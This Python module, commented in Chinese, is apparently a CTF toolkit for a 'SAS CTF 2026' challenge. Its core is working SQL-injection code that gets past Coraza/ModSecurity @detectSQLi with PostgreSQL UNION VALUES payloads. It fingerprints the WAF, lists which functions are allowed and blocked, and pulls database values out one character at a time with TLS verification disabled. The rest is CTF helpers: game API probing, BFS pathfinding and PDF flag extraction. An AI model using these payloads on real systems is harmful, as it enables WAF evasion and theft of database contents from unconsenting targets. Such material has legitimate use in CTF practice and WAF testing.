import urllib.parse
#!/usr/bin/python3
"""
CTF WAF Bypass Module - Coraza/ModSecurity/云WAF绕过技术
基于SAS CTF 2026 Gav题实战验证
"""
import re, urllib.parse, time, json
from typing import List, Dict, Tuple, Optional

class WAFBypass:
    """WAF绕过技术库"""
    
    # ═══════════════════════════════════════════════
    # Coraza/ModSecurity @detectSQLi 绕过
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def union_values_bypass(base_url: str, param: str, 
                           target_expr: str = "current_database()",
                           prefix: str = "x' ") -> List[Dict]:
        """
        Coraza WAF绕过: UNION VALUES完全绕过@detectSQLi
        
        原理: OWASP CRS检测UNION SELECT但不检测UNION VALUES
        PostgreSQL支持: SELECT ... UNION VALUES (...) 语法
        
        Args:
            base_url: 目标URL
            param: 注入参数名
            target_expr: 要提取的SQL表达式
            prefix: 注入前缀
            
        Returns:
            提取结果列表
        """
        results = []
        
        # 测试WAF是否被绕过
        test_payload = f"{prefix}UNION VALUES('test')--"
        test_url = f"{base_url}?{param}={urllib.parse.quote(test_payload)}"
        
        try:
            import urllib.request, ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(test_url)
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode(errors="ignore")
            
            if resp.getcode() == 200 and "test" in body:
                print(f"[+] UNION VALUES绕过成功!")
                
                # 逐字符提取
                for i in range(50):  # 最多提取50字符
                    if i == 0:
                        expr = f"left({target_expr},1)"
                    else:
                        expr = f"left(right({target_expr},-{i}),1)"
                    
                    payload = f"{prefix}UNION VALUES(''||ASCII({expr}))--"
                    url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    req = urllib.request.Request(url)
                    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                    body = resp.read().decode(errors="ignore")
                    
                    # 提取ASCII值
                    ascii_match = re.search(r'(\d{1,3})', body)
                    if ascii_match:
                        ascii_val = int(ascii_match.group(1))
                        if ascii_val == 0:  # 到达字符串末尾
                            break
                        char = chr(ascii_val)
                        results.append({
                            "position": i+1,
                            "ascii": ascii_val,
                            "char": char
                        })
                        print(f"  Position {i+1}: ASCII={ascii_val} char='{char}'")
                    else:
                        break
                        
        except Exception as e:
            print(f"[-] 绕过失败: {e}")
            
        return results
    
    @staticmethod
    def extract_with_left_right(base_url: str, param: str,
                               target_expr: str,
                               prefix: str = "x' ",
                               max_len: int = 50) -> str:
        """
        使用left/right替代substring提取数据
        
        当substring()被WAF拦截时:
        left(right(text,-N),1) 提取第N+1个字符
        """
        result = ""
        
        for i in range(max_len):
            if i == 0:
                expr = f"left({target_expr},1)"
            else:
                expr = f"left(right({target_expr},-{i}),1)"
            
            payload = f"{prefix}UNION VALUES(''||ASCII({expr}))--"
            url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            
            try:
                import urllib.request, ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                body = resp.read().decode(errors="ignore")
                
                ascii_match = re.search(r'(\d{1,3})', body)
                if ascii_match:
                    ascii_val = int(ascii_match.group(1))
                    if ascii_val == 0:
                        break
                    result += chr(ascii_val)
                else:
                    break
            except:
                break
                
        return result
    
    # ═══════════════════════════════════════════════
    # WAF允许/拦截函数矩阵 (SAS CTF 2026实测)
    # ═══════════════════════════════════════════════
    
    ALLOWED_FUNCTIONS = [
        "current_database()", "current_setting()", "current_user", 
        "pg_backend_pid()", "trim()", "upper()", "lower()", 
        "reverse()", "initcap()", "left()", "right()", 
        "ASCII()", "set_config()", "''||expr"
    ]
    
    BLOCKED_FUNCTIONS = [
        "substring()", "replace()", "regexp_replace()", "translate()",
        "length()", "char_length()", "octet_length()", "strpos()", 
        "position()", "overlay()", "lpad()", "rpad()", "split_part()",
        "pg_read_file()", "lo_import()", "lo_from_bytea()",
        "dblink_connect()", "dblink_exec()", "CASE WHEN", "(SELECT ...)"
    ]
    
    @staticmethod
    def get_safe_functions() -> List[str]:
        """获取WAF允许的安全函数列表"""
        return WAFBypass.ALLOWED_FUNCTIONS.copy()
    
    @staticmethod
    def is_function_allowed(func_name: str) -> bool:
        """检查函数是否被WAF允许"""
        for blocked in WAFBypass.BLOCKED_FUNCTIONS:
            if func_name.lower() in blocked.lower():
                return False
        return True
    
    # ═══════════════════════════════════════════════
    # PL/pgSQL EXECUTE注入检测
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def detect_plpgsql_execute_injection(url: str, param: str) -> bool:
        """
        检测PL/pgSQL EXECUTE字符串拼接注入
        
        特征:
        - 单引号触发SQL错误(500)
        - UNION VALUES绕过WAF
        - 数字通道回显
        """
        test_payloads = [
            "'",  # 单引号触发错误
            "' UNION VALUES('test')--",  # UNION VALUES绕过
        ]
        
        for payload in test_payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                import urllib.request, ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                req = urllib.request.Request(test_url)
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                code = resp.getcode()
                
                if code == 500 and payload == "'":
                    print(f"[+] 检测到SQL注入点(500错误)")
                elif code == 200 and "UNION VALUES" in payload:
                    print(f"[+] UNION VALUES绕过成功")
                    return True
            except:
                pass
                
        return False
    
    # ═══════════════════════════════════════════════
    # Coraza WAF特征检测
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def detect_coraza_waf(url: str) -> bool:
        """
        检测是否使用Coraza WAF
        
        特征:
        - @detectSQLi评分系统
        - 检查ARGS_NAMES|ARGS(GET参数)
        - 不检查Cookie/POST body/Header
        """
        # 测试SQL注入被拦截
        test_payload = "' OR 1=1--"
        test_url = f"{url}?id={urllib.parse.quote(test_payload)}"
        
        try:
            import urllib.request, ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(test_url)
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            
            if resp.getcode() == 403:
                print(f"[+] 检测到WAF拦截(403)")
                
                # 测试UNION VALUES是否绕过
                bypass_payload = "' UNION VALUES('test')--"
                bypass_url = f"{url}?id={urllib.parse.quote(bypass_payload)}"
                req = urllib.request.Request(bypass_url)
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                
                if resp.getcode() == 200:
                    print(f"[+] 确认为Coraza/类似WAF，UNION VALUES可绕过")
                    return True
                    
        except:
            pass
            
        return False


class GameAPIBypass:
    """游戏题API绕过模块 (Kolobok模式)"""
    
    # ═══════════════════════════════════════════════
    # 游戏API端点发现
    # ═══════════════════════════════════════════════
    
    COMMON_GAME_ENDPOINTS = [
        "/game_state", "/game/status", "/api/game",
        "/move", "/move_manual", "/api/move",
        "/reset", "/reset_game", "/api/reset",
        "/get_flag", "/flag", "/api/flag",
        "/submit", "/submit_kernel", "/api/submit",
    ]
    
    @staticmethod
    def discover_game_api(base_url: str) -> Dict[str, str]:
        """发现游戏API端点"""
        endpoints = {}
        
        try:
            import urllib.request, ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            for endpoint in GameAPIBypass.COMMON_GAME_ENDPOINTS:
                url = f"{base_url}{endpoint}"
                try:
                    req = urllib.request.Request(url)
                    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                    code = resp.getcode()
                    
                    if code in [200, 405]:  # 405 Method Not Allowed也表示存在
                        endpoints[endpoint] = f"HTTP {code}"
                        print(f"[+] 发现游戏API: {endpoint} ({code})")
                except urllib.error.HTTPError as e:
                    if e.code == 405:
                        endpoints[endpoint] = f"HTTP {e.code} (需要POST)"
                        print(f"[+] 发现游戏API: {endpoint} (需要POST)")
                except:
                    pass
                    
        except Exception as e:
            print(f"[-] API发现失败: {e}")
            
        return endpoints
    
    # ═══════════════════════════════════════════════
    # 游戏状态获取
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def get_game_state(base_url: str, 
                      state_endpoint: str = "/game_state") -> Optional[Dict]:
        """获取游戏状态"""
        try:
            import urllib.request, ssl, json
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            url = f"{base_url}{state_endpoint}"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode(errors="ignore")
            
            try:
                return json.loads(body)
            except:
                print(f"[-] 状态响应非JSON: {body[:100]}")
                return None
                
        except Exception as e:
            print(f"[-] 获取状态失败: {e}")
            return None
    
    # ═══════════════════════════════════════════════
    # 游戏移动控制
    # ═══════════════════════════════════════════════
    
    DIRECTION_MAP = {
        "left":  {"dx": -1, "dy": 0},
        "right": {"dx": 1, "dy": 0},
        "up":    {"dx": 0, "dy": -1},
        "down":  {"dx": 0, "dy": 1},
        "不动":  {"dx": 0, "dy": 0},
        "左":    {"dx": -1, "dy": 0},
        "右":    {"dx": 1, "dy": 0},
        "上":    {"dx": 0, "dy": -1},
        "下":    {"dx": 0, "dy": 1},
    }
    
    @staticmethod
    def move_manual(base_url: str, direction: str,
                   move_endpoint: str = "/move_manual") -> Optional[Dict]:
        """
        手动移动游戏对象
        
        Args:
            base_url: 游戏URL
            direction: 方向 (left/right/up/down/左/右/上/下)
            move_endpoint: 移动API端点
        """
        if direction not in GameAPIBypass.DIRECTION_MAP:
            print(f"[-] 未知方向: {direction}")
            return None
            
        move_data = GameAPIBypass.DIRECTION_MAP[direction]
        
        try:
            import urllib.request, ssl, json
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            url = f"{base_url}{move_endpoint}"
            data = json.dumps(move_data).encode()
            
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/json")
            
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode(errors="ignore")
            
            try:
                result = json.loads(body)
                print(f"[+] 移动成功: {direction} -> {result.get('status', 'ok')}")
                return result
            except:
                print(f"[-] 移动响应非JSON: {body[:100]}")
                return None
                
        except Exception as e:
            print(f"[-] 移动失败: {e}")
            return None
    
    # ═══════════════════════════════════════════════
    # BFS自动寻路 (Kolobok模式)
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def bfs_path(start: Tuple[int, int], 
                goal: Tuple[int, int],
                walls: set,
                enemies: set = None,
                grid_size: int = 20) -> Optional[List[Dict]]:
        """
        BFS寻路算法 (游戏题专用)
        
        Args:
            start: 起始位置 (x, y)
            goal: 目标位置 (x, y)
            walls: 墙壁位置集合
            enemies: 敌人位置集合 (可选)
            grid_size: 网格大小
        """
        from collections import deque
        
        if enemies is None:
            enemies = set()
            
        # 方向: 右、左、下、上
        dirs = [(1,0), (-1,0), (0,1), (0,-1)]
        dir_names = ["right", "left", "down", "up"]
        
        queue = deque([(start[0], start[1], [])])
        visited = {(start[0], start[1])}
        
        while queue:
            x, y, path = queue.popleft()
            
            if (x, y) == goal:
                return path
                
            for (dx, dy), dir_name in zip(dirs, dir_names):
                nx, ny = x + dx, y + dy
                key = (nx, ny)
                
                # 检查边界
                if nx < 0 or nx >= grid_size or ny < 0 or ny >= grid_size:
                    continue
                    
                # 检查墙壁
                if key in walls:
                    continue
                    
                # 检查已访问
                if key in visited:
                    continue
                    
                # 检查敌人邻格 (可选)
                if enemies:
                    enemy_nearby = False
                    for edx, edy in dirs:
                        if (nx+edx, ny+edy) in enemies:
                            enemy_nearby = True
                            break
                    if enemy_nearby:
                        continue
                        
                visited.add(key)
                queue.append((nx, ny, path + [{"dx": dx, "dy": dy, "direction": dir_name}]))
                
        return None  # 无法到达
    
    # ═══════════════════════════════════════════════
    # Kernel Sandbox限制检测
    # ═══════════════════════════════════════════════
    
    COMMON_SANDBOX_RESTRICTIONS = [
        "import", "__name__", "__class__", "lambda",
        "while", "return", "or", "and", "list()", "type()",
        "print()", "if else", "三元表达式"
    ]
    
    @staticmethod
    def detect_sandbox_restrictions(kernel_code: str) -> List[str]:
        """检测kernel代码中的sandbox限制"""
        restrictions = []
        
        for restriction in GameAPIBypass.COMMON_SANDBOX_RESTRICTIONS:
            if restriction in kernel_code:
                restrictions.append(restriction)
                
        if restrictions:
            print(f"[!] 检测到sandbox限制: {', '.join(restrictions)}")
            
        return restrictions


class PDFLeakExtractor:
    """PDF泄露Flag提取模块"""
    
    # ═══════════════════════════════════════════════
    # PDF文本提取
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def extract_text_from_pdf(pdf_path: str) -> str:
        """从PDF提取文本"""
        import subprocess
        
        # 尝试mutool
        try:
            result = subprocess.run(
                ["mutool", "draw", "-F", "txt", pdf_path, "1"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except:
            pass
            
        # 尝试pdftotext
        try:
            result = subprocess.run(
                ["pdftotext", pdf_path, "-"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except:
            pass
            
        # 尝试strings
        try:
            result = subprocess.run(
                ["strings", pdf_path],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except:
            pass
            
        return ""
    
    # ═══════════════════════════════════════════════
    # Flag模式匹配
    # ═══════════════════════════════════════════════
    
    FLAG_PATTERNS = [
        r"flag\{[^}]{3,80}\}",
        r"FLAG\{[^}]{3,80}\}",
        r"ctf\{[^}]{3,80}\}",
        r"CTF\{[^}]{3,80}\}",
        r"SAS\{[^}]{3,80}\}",
        r"key\{[^}]{3,80}\}",
        r"KEY\{[^}]{3,80}\}",
        r"secret\{[^}]{3,80}\}",
        r"token\{[^}]{3,80}\}",
    ]
    
    @staticmethod
    def extract_flags_from_text(text: str) -> List[str]:
        """从文本中提取flag"""
        flags = []
        
        for pattern in PDFLeakExtractor.FLAG_PATTERNS:
            matches = re.findall(pattern, text, re.IGNORECASE)
            flags.extend(matches)
            
        return list(set(flags))
    
    # ═══════════════════════════════════════════════
    # PDF泄露检测
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def detect_pdf_leak(pdf_path: str) -> Dict:
        """
        检测PDF中的flag泄露
        
        Returns:
            {
                "flags": [...],
                "text_preview": "...",
                "tables": [...]
            }
        """
        result = {
            "flags": [],
            "text_preview": "",
            "tables": []
        }
        
        # 提取文本
        text = PDFLeakExtractor.extract_text_from_pdf(pdf_path)
        if not text:
            print(f"[-] 无法提取PDF文本")
            return result
            
        result["text_preview"] = text[:500]
        
        # 提取flag
        flags = PDFLeakExtractor.extract_flags_from_text(text)
        result["flags"] = flags
        
        if flags:
            print(f"[+] 发现{len(flags)}个flag:")
            for flag in flags:
                print(f"  - {flag}")
        else:
            print(f"[-] 未发现flag")
            
        return result
    
    # ═══════════════════════════════════════════════
    # 批量PDF扫描
    # ═══════════════════════════════════════════════
    
    @staticmethod
    def scan_pdf_directory(pdf_dir: str) -> List[Dict]:
        """扫描目录中的所有PDF文件"""
        import os
        
        results = []
        
        for root, dirs, files in os.walk(pdf_dir):
            for file in files:
                if file.lower().endswith('.pdf'):
                    pdf_path = os.path.join(root, file)
                    print(f"\n[*] 扫描: {pdf_path}")
                    
                    result = PDFLeakExtractor.detect_pdf_leak(pdf_path)
                    if result["flags"]:
                        results.append({
                            "file": pdf_path,
                            "flags": result["flags"]
                        })
                        
        return results


# ═══════════════════════════════════════════════
# 测试代码
# ═══════════════════════════════════════════════

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 waf_bypass.py waf_detect <url>")
        print("  python3 waf_bypass.py union_values <url> <param> [expr]")
        print("  python3 waf_bypass.py game_api <url>")
        print("  python3 waf_bypass.py pdf_leak <pdf_path>")
        sys.exit(1)
        
    cmd = sys.argv[1]
    
    if cmd == "waf_detect":
        if len(sys.argv) < 3:
            print("用法: python3 waf_bypass.py waf_detect <url>")
            sys.exit(1)
        url = sys.argv[2]
        WAFBypass.detect_coraza_waf(url)
        
    elif cmd == "union_values":
        if len(sys.argv) < 4:
            print("用法: python3 waf_bypass.py union_values <url> <param> [expr]")
            sys.exit(1)
        url = sys.argv[2]
        param = sys.argv[3]
        expr = sys.argv[4] if len(sys.argv) > 4 else "current_database()"
        WAFBypass.union_values_bypass(url, param, expr)
        
    elif cmd == "game_api":
        if len(sys.argv) < 3:
            print("用法: python3 waf_bypass.py game_api <url>")
            sys.exit(1)
        url = sys.argv[2]
        GameAPIBypass.discover_game_api(url)
        
    elif cmd == "pdf_leak":
        if len(sys.argv) < 3:
            print("用法: python3 waf_bypass.py pdf_leak <pdf_path>")
            sys.exit(1)
        pdf_path = sys.argv[2]
        PDFLeakExtractor.detect_pdf_leak(pdf_path)
        
    else:
        print(f"未知命令: {cmd}")
        sys.exit(1)
